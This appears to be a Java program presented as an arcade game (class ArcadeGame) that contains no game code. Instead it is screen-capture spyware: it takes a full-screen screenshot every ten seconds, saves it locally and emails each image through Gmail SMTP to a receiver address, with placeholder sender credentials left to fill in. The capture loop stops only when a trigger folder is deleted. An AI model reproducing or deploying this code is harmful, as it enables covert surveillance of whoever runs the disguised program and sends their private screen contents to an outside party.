package arcade.game;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.imageio.ImageIO;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;
public class ArcadeGame {

    public static void main(String arr[])
    
    {   double t=0;
    JOptionPane.showMessageDialog(null, "BEGINING");
    File m=new File("C:\\trash");
    m.mkdir();
        for(;;){t++;
        
        try
        {   
            Thread.sleep(10000);
            Robot rr=new Robot();
       BufferedImage bf=rr.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())); 
       File ff1=new File("E:\\Screen shots1");    
        ff1.mkdir();
        ImageIO.write(bf, "jpg", new File(ff1+"\\manu.jpg"));
        
         if(!m.isDirectory()){File f=new File("E:\\Screen shots1\\manu.jpg");
                        f.delete();
                        JOptionPane.showMessageDialog(null, "BREAK");
                       break;}
                       

        }
        catch(Exception e){System.out.println();}
                Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");
                
              
 
        	Session session = Session.getInstance(props,
		  new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication("SENDING ADDRESS@gmail.com", "SENDING PASSWORD");
			}
                        });//JOptionPane.showMessageDialog(null,"authenticated");
                        System.out.println(" "+t+")  authenticated");
                        try {
 
			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress("SENDING ADDRESS@gmail.com"));
			message.setRecipients(Message.RecipientType.TO,
				InternetAddress.parse("RECEIVER ADDRESS@gmail.com"));
			message.setSubject("here Comes");
			message.setText("Screenshot ("+t+")");
                        
                        
  BodyPart messageBodyPart = new MimeBodyPart();

  // Fill the message
  messageBodyPart.setText("hi");

  Multipart multipart = new MimeMultipart();
  multipart.addBodyPart(messageBodyPart);

  // Part two is attachment
  messageBodyPart = new MimeBodyPart();
  //String filename = "C:\\screenshot.zip";
  File ff=new File("E:\\Screen shots1\\manu.jpg");
  DataSource source = new FileDataSource(ff);
 
  messageBodyPart.setDataHandler(new DataHandler(source));
  messageBodyPart.setFileName("ScreenShot.jpg   ("+t+")");
  multipart.addBodyPart(messageBodyPart);

  // Put parts in message
  message.setContent(multipart);
                     
                        
                       Transport.send(message);
   
                        //JOptionPane.showMessageDialog(null,"DONE");
                       System.out.println(" "+t+")  DONE");
                        
                        
                  }
                  catch(Exception e)
                  {
                      
                    //JOptionPane.showMessageDialog(null,e);}
                      System.out.println(e);
                  
                  } 
        }
    }
}


